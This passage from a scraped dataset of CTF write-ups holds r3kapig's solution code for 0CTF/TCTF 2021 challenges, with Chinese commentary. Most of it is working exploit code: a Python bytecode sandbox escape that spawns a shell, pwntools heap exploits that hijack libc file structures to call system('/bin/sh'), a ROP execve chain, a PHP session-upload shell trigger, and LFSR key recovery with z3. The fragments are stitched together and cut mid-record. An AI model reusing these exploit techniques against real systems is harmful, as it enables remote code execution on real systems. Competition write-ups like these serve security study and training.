cmp_op.index(\"!=\")])\n\ndef gen_zero():\n    return \\\n        gen_false() + \\\n        gen_false() + \\\n        bytes([opmap[\"BINARY_ADD\"], 0])\n\ndef gen_one():\n    return \\\n        gen_true() + \\\n        gen_false() + \\\n        bytes([opmap[\"BINARY_ADD\"], 0])\n\ndef dup_top():\n    return bytes([opmap[\"DUP_TOP\"], 0])\n\ndef gen_int(x: int):\n    if x == 0:\n        return gen_zero()\n    if x < 0:\n        return gen_int(-x) + bytes([opmap[\"UNARY_NEGATIVE\"], 0])\n    b = bin(x)[2:]\n    b = b[::-1]\n    n = len(b)\n    ans = gen_one()\n    for i in range(n-1):\n        if b[i] == '1':\n            ans += dup_top()\n        ans += dup_top()\n        ans += bytes([opmap[\"BINARY_ADD\"], 0])\n    for i in range(n-1):\n        if b[i] == '1':\n            ans += bytes([opmap[\"BINARY_ADD\"], 0])\n    return ans\n\ndef gen_empty_str():\n    return bytes([opmap[\"BUILD_STRING\"], 0])\n\ndef gen_char(c):\n    s = f\"{''.__class__.__dict__}\"\n    if c not in s:\n        raise ValueError()\n    idx = s.index(c)\n    return \\\n        gen_empty_str() + \\\n        get_class() + \\\n        get_dict() + \\\n        bytes([opmap[\"FORMAT_VALUE\"], 1]) + \\\n        gen_int(idx) + \\\n        bytes([opmap[\"BINARY_SUBSCR\"], 0])\n\ndef gen_string(helper, s: str):\n    hint, code = helper()\n    shint = f'{hint}'\n    idx = shint.find(s)\n    return code + \\\n        bytes([opmap[\"FORMAT_VALUE\"], 1]) + \\\n        gen_int(idx) + \\\n        gen_int(idx + len(s)) + \\\n        bytes([opmap[\"BUILD_SLICE\"], 2]) + \\\n        bytes([opmap[\"BINARY_SUBSCR\"], 0])\n\ndef str_helper1():\n    # __base__, __subclassess__, __init__, __getattribute__\n    hint = ''.__class__.__class__.__dict__\n    code = \\\n        gen_empty_str() + \\\n        get_class() + \\\n        get_class() + \\\n        get_dict()\n    return hint, code\n\ndef str_helper2(ini = None):\n    # __globals__\n    hint = os._wrap_close.__init__.__class__.__dict__\n    code = \\\n        b\"\" + \\\n        get_class() + \\\n        get_dict()\n    return hint, code\n\ndef str_helper3(glb = None):\n    # system, sh\n    hint = os._wrap_close.__init__.__globals__\n    code = b\"\"\n    return hint, code\n\ndef call_method(x):\n    return bytes([opmap[\"CALL_METHOD\"], x])\n\ndef call_function(x):\n    return bytes([opmap[\"CALL_FUNCTION\"], x])\n\ndef save_var(x = 1):\n    return bytes([opmap[\"STORE_NAME\"], x])\n\ndef load_var(x = 1):\n    return bytes([opmap[\"LOAD_NAME\"], x])\n\ndef binary_subscr():\n    return bytes([opmap[\"BINARY_SUBSCR\"], 0])\n\n\ndef gen_char(c):\n    s = f\"{''.__class__.__dict__}\"\n    if c not in s:\n        raise ValueError()\n    idx = s.index(c)\n    return \\\n        gen_empty_str() + \\\n        get_class() + \\\n        get_dict() + \\\n        bytes([opmap[\"FORMAT_VALUE\"], 1]) + \\\n        gen_int(idx) + \\\n        bytes([opmap[\"BINARY_SUBSCR\"], 0])\n\n\ndef gen_string_old(s:str):\n    if len(s) == 0:\n        return gen_empty_str()\n    ans = gen_char(s[0])\n    for x in s[1:]:\n        ans += gen_char(x)\n        ans += bytes([opmap[\"BINARY_ADD\"], 0])\n    return ans\n\n\ndef get_code():\n    code = b\"\"\n\n    # <class 'object'>\n    code += gen_empty_str()\n    code += get_class()\n    code += get_class()\n    code += get_dict()\n    code += gen_string(str_helper1, '__getattribute__')\n    code += binary_subscr()\n    code += gen_empty_str()\n    code += get_class()\n    code += gen_string(str_helper1, '__base__')\n    code += call_function(2)\n\n    # object.__subclassess__()\n    code += save_var(1)\n    code += load_var(1)\n    code += get_dict()\n    code += gen_string(str_helper1, '__getattribute__')\n    code += binary_subscr()\n    code += load_var(1)\n    code += gen_string(str_helper1, '__subclasses__')\n    code += call_function(2)\n    code += call_function(0)\n\n    # save subclasses\n    code += save_var(0)\n\n    \"\"\"\n    # exception\n    code += bytes([opmap[\"BUILD_MAP\"], 0])\n    code += load_var(0)\n    code += bytes([opmap[\"FORMAT_VALUE\"], 1])\n    code += binary_subscr()\n    \"\"\"\n\n    # <class 'os._wrap_close'>\n    code += load_var(0)\n    code += gen_int(133) # 133\n    code += binary_subscr()\n\n    # _wrap_close.__init__\n    code += save_var(1)\n    code += load_var(1)\n    code += get_class()\n    code += get_dict()\n    code += gen_string(str_helper1, '__getattribute__')\n    code += binary_subscr()\n    code += load_var(1)\n    code += gen_string(str_helper1, '__init__')\n    code += call_function(2)\n\n    # __globals__\n    code += save_var(1) # save init\n    code += load_var(0) # load attrgetter\n    code += gen_int(148) # 168\n    code += binary_subscr() # attrgetter\n    code += load_var(1) # load init\n    code += gen_string(str_helper2, '__globals__')\n    code += call_function(1)\n    code += load_var(1) # load init\n    code += call_function(1)\n\n    # globals[\"system\"](\"sh\")\n    code += save_var(1)\n    code += load_var(1)\n    code += load_var(1)\n    code += gen_string(str_helper3, \"system\")\n    code += bytes([opmap[\"BINARY_SUBSCR\"], 0])\n\n    #code += load_var(1)\n    code += gen_string_old(\"sh\")\n\n    code += call_function(1)\n\n    code += gen_return()\n    #print(''.join(\"%02x\" % x for x in code))\n    #dis.dis(code)\n    #print(len(code))\n    #print()\n    assert len(code) <= 2000\n    hex_code = ''.join('%02x' % x for x in code)\n    return hex_code\n\nfrom pwn import *\n\ncontext.log_level = \"debug\"\n\ncode = get_code()\nr = remote(\"111.186.58.164\", 13337)\nr.recvuntil(\"in hex\", timeout=1)\nr.recvuntil(\"in hex\", timeout=1)\nr.sendline(code)\nr.recvuntil(\"gift1\", timeout=1)\nr.sendline(\"class\")\nr.recvuntil(\"gift2\", timeout=1)\nr.sendline(\"dict\")\nr.interactive()\n\n# 0x00\ns = '5b'         # jumpdest                    1\ns += '6050'       # push1 0x50     3\ns += '5a'         # gas            2\ns += '11'         # GT             3\ns += '6000'       # push1 0x00     3\ns += '57'         # jumpi         10\n\n# 0x08\ns += '5a'         # gas                   2\ns += '606b'       # push1 0x6b            3\ns += '03'         # sub                   3\ns += '56'         # jump                  8\ns += '5b'*0x50    # jumpdest*50          1\ns += '00'         # stop\n\nprint(s)\n\n# 107 - 30 = 77\n# 93 - 16 = 77\n\n    char buf[16];\n    printf(\"index: \");\n    read(0, buf, 4);\n    if (buf[0]>='0' && buf[0]<='9') {\n        int idx = buf[0]-'0';\n        if (seeds[idx]) {\n            run.dynfile->size = seedssz[idx];\n            memcpy(run.dynfile->data, seeds[idx], seedssz[idx]);\n            mangle_mangleContent(&run, 1);\n            seedssz[idx] = run.dynfile->size;\n            seeds[idx] = util_Realloc(seeds[idx], seedssz[idx]);\n            memcpy(seeds[idx], run.dynfile->data, seedssz[idx]);\n        }\n    }\n\n\n    int i=0;\n    while (i<10 && seeds[i]) i++;\n    if (i<10) {\n        printf(\"size: \");\n        scanf(\"%d\", &seedssz[i]);\n        int sz = seedssz[i]+1;\n        if (sz>0 && sz<0x8000) {\n            printf(\"content: \");\n            seeds[i] = util_Calloc(sz);\n            read(0, seeds[i], seedssz[i]);\n        }\n    }\n\n\n        io = process(argv=[ld.path,myelf.path],env={\"LD_PRELOAD\":'./libc-2.30.so'})\n        gdb_text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(io.pid)).readlines()[1], 16)\n        gdb_libc_base = int(os.popen(\"pmap {}| grep libc | awk '{{print $1}}'\".format(io.pid)).readlines()[0], 16)\n        \n\n\n        io = process(argv = [myelf.path])#,env={\"LD_PRELOAD\":'./libc-2.31.so'})\n        gdb_text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(io.pid)).readlines()[1], 16)\n        gdb_libc_base = int(os.popen(\"pmap {}| grep libc | awk '{{print $1}}'\".format(io.pid)).readlines()[0], 16)\n\n\n        io = remote('111.186.59.27', 12345)\n        exp()\n        while(1):\n                try:\n                        #io = process(argv = [myelf.path])\n                        io = remote('111.186.59.27', 12345)\n                        exp()\n                except Exception as e:\n                        print(\"failed\")\n                        io.close()\n\n\n    rsp = uc.reg_read(UC_X86_REG_RSP)\n    rip = uc.reg_read(UC_X86_REG_RIP)\n    print(\"rip ==> 0x{:x}, rsp ==> 0x{:x}\".format(rip, rsp))\n\n\n    if rax2 not in range(0xdeadbef0000+0x80, 0xdeadbef0000+0x9b):\n        print(\"-----nonono-----\")\n        exit()\n\n\n    print(\"0x%x:\\t%s\\t%s\" %(i.address, i.mnemonic, i.op_str))\n\n\n    print(\"0x%x:\\t%s\\t%s\" %(i.address, i.mnemonic, i.op_str))\n\n\n    p.sendlineafter(\">>\",str(c))def add(name='\\n',c='A\\n'):\n    cmd(1)\n    p.sendafter(\">\",name)\n    p.sendafter(\">\",c)def free(idx):\n    cmd(2)\n    p.sendlineafter(\">\",str(idx))def show(idx):\n    cmd(3)\n    p.sendlineafter(\">\",str(idx))#p=process(\"./pwn\")\n\n\n    while True:\n        r = session.post(url+'?yxxx=zip:///tmp/sess_'+sessid+'%23'+'shell', data={})\n        if '@evoA yyds' in r.text:\n            print(r.text.strip('@evoA yyds'))\n            event.clear()\n            sys.exit()\n\n\n    choice = d[0]\n    m = d[1]\n    r = d[2]\n    if choice == 2:\n        step = 1\n        idx = 10 * m\n    elif choice == 3:\n        step = -1\n        idx = 10 * (m+1) -1\n    elif choice == 0:\n        step = 10\n        idx = m\n    elif choice == 1:\n        step = -10\n        idx = 10 * 9 + m\n    print(step, idx)\n    j = 0\n    num = 0\n    max = -1\n    sum = 0\n    while True:\n        if j == 10:\n            break\n        c = x[idx]\n        # print(c)\n        assert 1<=c<=10\n        num |= (1 << c-1)\n        if c > max:\n            max = c\n            sum += 1\n        else:\n            idx += step\n            j += 1\n    # print(num, sum)\n    # print(1023, r)\n    if num == 1023: # 0b1111111111\n        if sum == r:\n            cnt += 1\n\n\n    print(\"correct\")\n\n\n    for (int i = 0; i < N; ++i) {\n        for (int j = 0; j < N; ++j)\n            printf(\"%d \", board[i][j]);\n        printf(\"\\n\");\n    }\n    exit(0);\n\n\n    int row = -1;\n    for (int i = 0; i < N; ++i)\n        if (!done_row[i]) {\n            if (row == -1 || avail_row[row].size() > avail_row[i].size())\n                row = i;\n        }\n    if (row == -1)\n        finish();\n    int col = -1;\n    for (int i = 0; i < N; ++i)\n        if (!done_col[i]) {\n            if (col == -1 || avail_row[col].size() > avail_col[i].size())\n                col = i;\n        }\n    //printf(\"has %d\\n\", has_set);\n\n\n    if (avail_row[row].size() < avail_col[col].size()) {\n        //printf(\"row %d\\n\", row);\n        for (int i = 0; i < N; ++i)\n            save[i] = board[row][i];\n        for (int i = 0; i < N; ++i)\n            if (save[i] == 0)\n                new_set++;\n\n\n            /* revert board*/\n            for (int i = 0; i < N; ++i)\n                board[row][i] = save[i];\n        }\n        done_row[row] = false;\n    }\n    else {\n        //printf(\"col %d\\n\", col);\n        for (int i = 0; i < N; ++i)\n            save[i] = board[i][col];\n        for (int i = 0; i < N; ++i)\n            if (save[i] == 0)\n                new_set++;\n\n\n    for i in tbl:\n        for j in tbl:\n            for k in tbl:\n                for l in tbl:\n                    ans = bytes([i,j,k,l])\n                    r = ans+question\n                    # print(sha256(r).hexdigest().encode())\n                    # print(res)\n                    if sha256(r).hexdigest().encode() == res:\n                        return ans\n\n\n    p.recvuntil(\"Here is your challenge:\\n\\n\")\n    chall = p.recvline()\n    print(len(chall))\n    print(ans)\n    name = 'chall_' + ans.decode()\n    open(name, \"wb\").write(base64.b64decode(chall))\n\n\n    res = subprocess.Popen(['gdb', name], stdin=subprocess.PIPE) \n    res.stdin.write(b'\\nsource fuck.py\\na\\n\\nquit\\n')\n    res.stdin.flush()\n    sleep(5)\n    res.kill()\n    print(name)\n\n\n    v5 = (v5 & 0xffff) - (v5 >> 0x10)\n    v5 = v5 - (v5 >> 0x10)\n    print(hex(p_0), hex(p_1), ans_0, ans_1, ((v2 ^ v5) << 0x10 | (v5 ^ v4) & 0xffff) & 0xffffffff, (((v1 ^ v7 + v5) & 0xffff | (v3 ^ v7 + v5) << 0x10) & 0xffffffff))\n    if ((v2 ^ v5) << 0x10 | (v5 ^ v4) & 0xffff) & 0xffffffff != ans_0:\n        return False\n\n\n        print(m[p_0])\n        print(m[p_1])\n        p_0 = int(m[p_0].as_long())\n        p_1 = int(m[p_1].as_long())\n\n\n        #print(hex(p_0 + 0x10000 + (p_1 << 32)))\n        #enc(p_0 + 0x10000 + (p_1 << 32))\n\n\n    #print((c1, c2))\n\n\n    def __init__(self, key: list):\n        assert len(key) == 64\n        self.NFSR = key[: 48]\n        self.LFSR = key[48: ]\n        self.TAP = [0, 1, 12, 15]\n        self.TAP2 = [[2], [5], [9], [15], [22], [26], [39], [26, 30], [5, 9], [15, 22, 26], [15, 22, 39], [9, 22, 26, 39]]\n        self.h_IN = [2, 4, 7, 15, 27]\n        self.h_OUT = [[1], [3], [0, 3], [0, 1, 2], [0, 2, 3], [0, 2, 4], [0, 1, 2, 4]]\n\n\n    def g(self):\n        x = self.NFSR\n        return _sum(_prod(x[i] for i in j) for j in self.TAP2)\n\n\n    def h(self):\n        x = [self.LFSR[i] for i in self.h_IN[:-1]] + [self.NFSR[self.h_IN[-1]]]\n        return _sum(_prod(x[i] for i in j) for j in self.h_OUT)\n\n\n    def f(self):\n        return _sum([self.NFSR[0], self.h()])\n\n\n    def clock(self):\n        o = self.f()\n        self.NFSR = self.NFSR[1: ] + [self.LFSR[0] ^ self.g()]\n        self.LFSR = self.LFSR[1: ] + [_sum(self.LFSR[i] for i in self.TAP)]\n        return o\n\n\n    def __init__(self, key):\n        assert len(key) == 64\n        self.NFSR = key[: 16]\n        self.LFSR = key[16: ]\n        self.TAP = [0, 35]\n        self.f_IN = [0, 10, 20, 30, 40, 47]\n        self.f_OUT = [[0, 1, 2, 3], [0, 1, 2, 4, 5], [0, 1, 2, 5], [0, 1, 2], [0, 1, 3, 4, 5], [0, 1, 3, 5], [0, 1, 3], [0, 1, 4], [0, 1, 5], [0, 2, 3, 4, 5], [\n            0, 2, 3], [0, 3, 5], [1, 2, 3, 4, 5], [1, 2, 3, 4], [1, 2, 3, 5], [1, 2], [1, 3, 5], [1, 3], [1, 4], [1], [2, 4, 5], [2, 4], [2], [3, 4], [4, 5], [4], [5]]\n        self.TAP2 = [[0, 3, 7], [1, 11, 13, 15], [2, 9]]\n        self.h_IN = [0, 2, 4, 6, 8, 13, 14]\n        self.h_OUT = [[0, 1, 2, 3, 4, 5], [0, 1, 2, 4, 6], [1, 3, 4]]\n\n\n    def f(self):\n        x = [self.LFSR[i] for i in self.f_IN]\n        return _sum(_prod(x[i] for i in j) for j in self.f_OUT)\n\n\n    def h(self):\n        x = [self.NFSR[i] for i in self.h_IN]\n        return _sum(_prod(x[i] for i in j) for j in self.h_OUT)        \n\n\n    def g(self):\n        x = self.NFSR\n        return _sum(_prod(x[i] for i in j) for j in self.TAP2)  \n\n\n    def clock(self):\n        self.LFSR = self.LFSR[1: ] + [_sum(self.LFSR[i] for i in self.TAP)]\n        self.NFSR = self.NFSR[1: ] + [self.LFSR[1] ^ self.g()]\n        return self.f() ^ self.h()\n\n\n    def __init__(self, key: list):\n        assert len(key) == 64\n        self.LFSR = key\n        self.TAP = [0, 55]\n        self.f_IN = [0, 8, 16, 24, 32, 40, 63]\n        self.f_OUT = [[1], [6], [0, 1, 2, 3, 4, 5], [0, 1, 2, 4, 6]]\n\n\n    def f(self):\n        x = [self.LFSR[i] for i in self.f_IN]\n        return _sum(_prod(x[i] for i in j) for j in self.f_OUT)\n\n\n    def clock(self):\n        self.LFSR = self.LFSR[1: ] + [_sum(self.LFSR[i] for i in self.TAP)]\n        return self.f()\n\n\n    def __init__(self, msk: int, t: int):\n        if t == 1:\n            self.g = Generator1(n2l(msk, 64))\n        elif t == 2:\n            self.g = Generator2(n2l(msk, 64))\n        else:\n            self.g = Generator3(n2l(msk, 64))\n        self.t = t\n\n\n    def next(self):\n        for i in range(self.t):\n            o = self.g.clock()\n        return o\n\n\n    prefix = \"\".join(random.choices(alphabet,k=4))\n    # print(prefix)\n    # print(prefix+suffix)\n    #print(hashlib.sha256((prefix+suffix).encode()).hexdigest())\n    if hashlib.sha256((prefix+suffix).encode()).hexdigest()==result:\n        pow = prefix\n        break\n\n\n    r.recvuntil(\"one:\")\n    r.sendline(str(i))\n    s = Solver()\n    msk = BitVec('msk',64)\n    r.recvuntil(\"start:::\")\n    keystream = r.recvuntil(\":::end\").decode('latin-1')\n    print(keystream[-6:])\n    keystream = keystream[:-6]\n    print(len(keystream))\n    lfsr = zer0lfsr(msk, i)\n    lfsr_bits = []\n    for i in range(1000):\n        c = ord(keystream[i])\n        temp_list = []\n        for j in range(8):\n            temp_list.append(c&1)\n            c >>= 1\n        temp_list = temp_list[::-1]\n        lfsr_bits += temp_list\n    print(len(lfsr_bits))\n    for i in range(200):\n        s.add(lfsr_bits[i] == lfsr.next())\n        #print(i)\n    print(\"add finished\")\n    print(s.check())\n    #assert s.check()==sat\n    msk = s.model()[msk]\n    print(msk)\n    r.recvuntil(\"hint: \")\n    hint = r.recvuntil(\"\\n\").decode()[:-1]\n    assert hashlib.sha256(str(msk).encode()).hexdigest()\n    r.recvuntil(\"k:\")\n    r.sendline(str(msk))\n\n\n    code += gen_return()\n    #print(''.join(\"%02x\" % x for x in code))\n    #dis.dis(code)\n    #print(len(code))\n    #print()\n    assert len(code) <= 2000\n    hex_code = ''.join('%02x' % x for x in code)\n    return hex_code\n", "tools": ["python", "z3", "gdb", "radare2"], "file_path": "temp_repos\\r3kapig_writeup\\20210706-0ctf-quals\\README.md", "file_size": 63181, "scraped_at": "2025-10-26T18:19:26.630109"}
{"id": "r3kapig_writeup_0CTF_TCTF_2021_Finals_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "0CTF/TCTF 2021 Finals Writeup", "attack_type": "Misc", "writeup": "# 0CTF/TCTF 2021 Finals Writeup\n\n## 前言\n\n九月底和 r3kapig 的大师傅们一起打了国际比赛 TCTF/0CTF final，最终战队取得了世界排名第二，国内排名第一的好成绩，现将师傅们的 wp 整理如下，分享给大家一起学习进步~ 同时也欢迎各位大佬加入 r3kapig 的大家庭，大家一起学习进步，相互分享~ 简历请投战队邮箱：root@r3kapig.com\n\n![1](img/1.jpg)\n\n\n\n## PWN\n\n### 0VM\n实现了一个简单的虚拟机，只不过虚拟机的指令是做完快速傅里叶变换后的膜长拼接出来的。做逆快速傅里叶变换就能求出应有的输入。虚拟机操作的内存通过单链表方式组织，在取出之后并没有将 block 的 fd 指针位置清空，但是已经将该 block 对应 mask 置1，所以可以正常读取泄露该指针，从而计算出libc地址。同时还有逻辑问题，在向链表插入mask为0 的 block 地址时，是先将要插入的 block 地址对应的内存置空，然后再去检查该 block 对应的 mask，所以可以用该漏洞，对一个已经加入链表的 block 空间的内存进行部分写空字节。然后就是劫持链表伪造结构体，从而进行任意读写了。\n```python\nfrom pwn import *\nimport os\n\ncontext.log_level = 'debug'\n\n# io = process('./0VM')\n# io = remote('121.5.102.199', 20000)\n# io = remote('192.168.163.135', 20000)\nlibc = ELF('./libc-2.31.so')\n\nrl = lambda\ta=False\t\t: io.recvline(a)\nru = lambda a,b=True\t: io.recvuntil(a,b)\nrn = lambda x\t\t\t: io.recvn(x)\nsn = lambda x\t\t\t: io.send(x)\nsl = lambda x\t\t\t: io.sendline(x)\nsa = lambda a,b\t\t\t: io.sendafter(a,b)\nsla = lambda a,b\t\t: io.sendlineafter(a,b)\nirt = lambda\t\t\t: io.interactive()\ndbg = lambda text=None  : gdb.attach(io, text)\n# lg = lambda s,addr\t\t: log.info('\\033[1;31;40m %s --> 0x%x \\033[0m' % (s,addr))\nlg = lambda s\t\t\t: log.info('\\033[1;31;40m %s --> 0x%x \\033[0m' % (s, eval(s)))\nuu32 = lambda data\t\t: u32(data.ljust(4, '\\x00'))\nuu64 = lambda data\t\t: u64(data.ljust(8, '\\x00'))\n\ntext ='''heapinfo\n'''\n\ndef wrap(op, parm1, parm2, parm3):\n\tcmd = \"./FFT \"\n\tcmd += str(op) + \" \"\n\tcmd += str(parm1) + \" \"\n\tcmd += str(parm2) + \" \"\n\tfor x in p64(parm3):\n\t\tcmd += str(ord(x)) + \" \"\n\tf = os.popen(cmd)\n\tres = f.readlines()\n\tfinal = \"\".join(res)\n\t# print final.encode('hex')\n\tsn(final)\n\ndef vm1_copy_data(idx1, idx2):\n\twrap(1, idx1, idx2, 0)\n\ndef vm2_assi_data(idx, val):\n\twrap(2, idx, 0, val)\n\ndef vm3_read_from_data(idx, val):\n\twrap(3, idx, 0, val)\n\ndef vm4_write_to_data(idx, val):\n\twrap(4, idx, 0, val)\n\ndef vm5_add_data(idx1, idx2):\n\twrap(5, idx1, idx2, 0)\n\ndef vmf1_show_map(val):\n\twrap(0xf, 1, 0, val)\n\ndef vmf2_alloc_map(val):\n\twrap(0xf, 2, 0, val)\n\ndef vmf3_edit_map(val):\n\twrap(0xf, 3, 0, val)\n\n\n# io = process('./0VM')\nio = remote('121.5.102.199', 20000)\n# io = remote('192.168.163.135', 20000)\nru(\"  #\\n\\n\")\n\nfor x in xrange(0x40):\n\tvmf2_alloc_map(0x82*0x10) \n\nvmf3_edit_map(0x82<<32 | 0)\nvmf3_edit_map(0x82<<32 | 0x820+0x10)\n\nvmf2_alloc_map(0x82*0x10)\n\nvmf1_show_map(0x82<<32 | 0) \n\nlibc_base = uu64(rn(8)) + 0x237d0\nlg('libc_base')\n\n\nmmap_addr = libc_base + 0x36f000\ntarget_addr = mmap_addr + 8*0x83\nvm2_assi_data(1, target_addr)\nvm3_read_from_data(1, 0x82<<32 | 0x820*2+0x7c0)\n\nvmf3_edit_map(0x82<<32 | 0x820*3)\n\nvmf3_edit_map(0x82<<32 | 0x820+0x10-7) \n\nvmf3_edit_map(0x82<<32 | 0x820*4)\n\nfor x in xrange(4):\n\tvmf2_alloc_map(0x82*0x10)\n\nio_file_jumps = libc_base + libc.sym['_IO_file_jumps']\nvm2_assi_data(1, io_file_jumps)\nvm3_read_from_data(1, 0x82<<32 | 0x820*4) \n\nvm2_assi_data(1, 0x0101010101010101)\nvm3_read_from_data(1, 0x82<<32 | 0x820*4+0x10)\n\nsystem_addr = libc_base + libc.sym['system']\nvm2_assi_data(1, system_addr)\nvm3_read_from_data(1, 0x83<<32 | 0+0x18)\n\nstderr_addr = libc_base + libc.sym['_IO_2_1_stderr_']\nvm2_assi_data(1, stderr_addr)\nvm3_read_from_data(1, 0x82<<32 | 0x820*4) \n\nbinsh = u64('/bin/sh\\x00')\nvm2_assi_data(1, binsh)\nvm3_read_from_data(1, 0x83<<32 | 0) \n\nvm2_assi_data(1, 1)\nvm3_read_from_data(1, 0x83<<32 | 0+0x20)\n\nvm2_assi_data(1, 2)\nvm3_read_from_data(1, 0x83<<32 | 0+0x28) \n\nwrap(6, 0, 0, 0)\n# dbg(text)\n# pause()\n\nirt()\n```\n\n### Secure JIT II\n\nOOB写直接ROP\n\n```python\ndef exp():\n    a = array(7)\n    a[0] = 0x20192019\n    a[10] = 0x421873 # ret\n    a[11] = 0x421095 # pop rax\n    a[12] = 59\n    a[13] = 0x421872 # pop rdi\n    a[14] = 0xa83ff0\n    a[15] = 0x42159a # pop rsi\n    a[16] = 0x6e69622f\n    a[17] = 0x4b2582 # 0x4b24d2\n    a[25] = 0x421872 # pop rdi\n    a[26] = 0xa83ff4\n    a[27] = 0x42159a # pop rsi\n    a[28] = 0x68732f\n    a[29] = 0x4b2582 # 0x4b24d2\n    a[37] = 0x421872 # pop rdi\n    a[38] = 0xa83ff0\n    a[39] = 0x42159a # pop rsi\n    a[40] = 0\n    a[41] = 0x4026c1 # pop rdx\n    a[42] = 0\n    a[43] = 0x4ff807 #0x43430c # syscall\n\n    # 0x4b2582 # 0x4b24d2 [rdi]=rsi; rsp+=0x38\n\n```\n\n### promise\n\nhttps://mem2019.github.io/jekyll/update/2021/09/27/TCTF2021-Promise.html\n\n### NaiveHeap\n1. 漏洞点是任意地址内存中指针的一次free，可以free tache的结构体，之后就可以重复利用。\n2. 重复利用tache结构体构造overlap。\n3. 修改size获得unsorted bin，partial write unsorted bin的fd把main_arena的bitsmap当作head。\n4. 一路往下写写到stdout，泄露libc，之后free_hook进行rop。\n5. 上一部分往下覆盖路过一个指针，如果指针指向内容不能读就会segfault，可以通过写另一个 fake size，然后利用free往上面打一个tcache的结构体地址，这样保证了那个地址可读\n\n```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\n\n# io = process('./chall', aslr=False)\n# io = process('./pwn', aslr=False)\n# io = remote('127.0.0.1', 4455)\nio = remote('1.117.189.158', 60001)\n# elf = ELF('./chall')\n# libc = elf.libc\n\nrl = lambda\ta=False\t\t: io.recvline(a)\nru = lambda a,b=True\t: io.recvuntil(a,b)\nrn = lambda x\t\t\t: io.recvn(x)\nsn = lambda x\t\t\t: io.send(x)\nsl = lambda x\t\t\t: io.sendline(x)\nsa = lambda a,b\t\t\t: io.sendafter(a,b)\nsla = lambda a,b\t\t: io.sendline", "solution_code": "from pwn import *\nimport os\n\ncontext.log_level = 'debug'\n\n# io = process('./0VM')\n# io = remote('121.5.102.199', 20000)\n# io = remote('192.168.163.135', 20000)\nlibc = ELF('./libc-2.31.so')\n\nrl = lambda\ta=False\t\t: io.recvline(a)\nru = lambda a,b=True\t: io.recvuntil(a,b)\nrn = lambda x\t\t\t: io.recvn(x)\nsn = lambda x\t\t\t: io.send(x)\nsl = lambda x\t\t\t: io.sendline(x)\nsa = lambda a,b\t\t\t: io.sendafter(a,b)\nsla = lambda a,b\t\t: io.sendlineafter(a,b)\nirt = lambda\t\t\t: io.interactive()\ndbg = lambda text=None  : gdb.attach(io, text)\n# lg = lambda s,addr\t\t: log.info('\\033[1;31;40m %s --> 0x%x \\033[0m' % (s,addr))\nlg = lambda s\t\t\t: log.info('\\033[1;31;40m %s --> 0x%x \\033[0m' % (s, eval(s)))\nuu32 = lambda data\t\t: u32(data.ljust(4, '\\x00'))\nuu64 = lambda data\t\t: u64(data.ljust(8, '\\x00'))\n\ntext ='''heapinfo\n'''\n\ndef wrap(op, parm1, parm2, parm3):\n\tcmd = \"./FFT \"\n\tcmd += str(op) + \" \"\n\tcmd += str(parm1) + \" \"\n\tcmd += str(parm2) + \" \"\n\tfor x in p64(parm3):\n\t\tcmd += str(ord(x)) + \" \"\n\tf = os.popen(cmd)\n\tres = f.readlines()\n\tfinal = \"\".join(res)\n\t# print final.encode('hex')\n\tsn(final)\n\ndef vm1_copy_data(idx1, idx2):\n\twrap(1, idx1, idx2, 0)\n\ndef vm2_assi_data(idx, val):\n\twrap(2, idx, 0, val)\n\ndef vm3_read_from_data(idx, val):\n\twrap(3, idx, 0, val)\n\ndef vm4_write_to_data(idx, val):\n\twrap(4, idx, 0, val)\n\ndef vm5_add_data(idx1, idx2):\n\twrap(5, idx1, idx2, 0)\n\ndef vmf1_show_map(val):\n\twrap(0xf, 1, 0, val)\n\ndef vmf2_alloc_map(val):\n\twrap(0xf, 2, 0, val)\n\ndef vmf3_edit_map(val):\n\twrap(0xf, 3, 0, val)\n\n\n# io = process('./0VM')\nio = remote('121.5.102.199', 20000)\n# io = remote('192.168.163.135', 20000)\nru(\"  #\\n\\n\")\n\nfor x in xrange(0x40):\n\tvmf2_alloc_map(0x82*0x10) \n\nvmf3_edit_map(0x82<<32 | 0)\nvmf3_edit_map(0x82<<32 | 0x820+0x10)\n\nvmf2_alloc_map(0x82*0x10)\n\nvmf1_show_map(0x82<<32 | 0) \n\nlibc_base = uu64(rn(8)) + 0x237d0\nlg('libc_base')\n\n\nmmap_addr = libc_base + 0x36f000\ntarget_addr = mmap_addr + 8*0x83\nvm2_assi_data(1, target_addr)\nvm3_read_from_data(1, 0x82<<32 | 0x820*2+0x7c0)\n\nvmf3_edit_map(0x82<<32 | 0x820*3)\n\nvmf3_edit_map(0x82<<32 | 0x820+0x10-7) \n\nvmf3_edit_map(0x82<<32 | 0x820*4)\n\nfor x in xrange(4):\n\tvmf2_alloc_map(0x82*0x10)\n\nio_file_jumps = libc_base + libc.sym['_IO_file_jumps']\nvm2_assi_data(1, io_file_jumps)\nvm3_read_from_data(1, 0x82<<32 | 0x820*4) \n\nvm2_assi_data(1, 0x0101010101010101)\nvm3_read_from_data(1, 0x82<<32 | 0x820*4+0x10)\n\nsystem_addr = libc_base + libc.sym['system']\nvm2_assi_data(1, system_addr)\nvm3_read_from_data(1, 0x83<<32 | 0+0x18)\n\nstderr_addr = libc_base + libc.sym['_IO_2_1_stderr_']\nvm2_assi_data(1, stderr_addr)\nvm3_read_from_data(1, 0x82<<32 | 0x820*4) \n\nbinsh = u64('/bin/sh\\x00')\nvm2_assi_data(1, binsh)\nvm3_read_from_data(1, 0x83<<32 | 0) \n\nvm2_assi_data(1, 1)\nvm3_read_from_data(1, 0x83<<32 | 0+0x20)\n\nvm2_assi_data(1, 2)\nvm3_read_from_data(1, 0x83<<32 | 0+0x28) \n\nwrap(6, 0, 0, 0)\n# dbg(text)\n# pause()\n\nirt()\n\ndef exp():\n    a = array(7)\n    a[0] = 0x20192019\n    a[10] = 0x421873 # ret\n    a[11] = 0x421095 # pop rax\n    a[12] = 59\n    a[13] = 0x421872 # pop rdi\n    a[14] = 0xa83ff0\n    a[15] = 0x42159a # pop rsi\n    a[16] = 0x6e69622f\n    a[17] = 0x4b2582 # 0x4b24d2\n    a[25] = 0x421872 # pop rdi\n    a[26] = 0xa83ff4\n    a[27] = 0x42159a # pop rsi\n    a[28] = 0x68732f\n    a[29] = 0x4b2582 # 0x4b24d2\n    a[37] = 0x421872 # pop rdi\n    a[38] = 0xa83ff0\n    a[39] = 0x42159a # pop rsi\n    a[40] = 0\n    a[41] = 0x4026c1 # 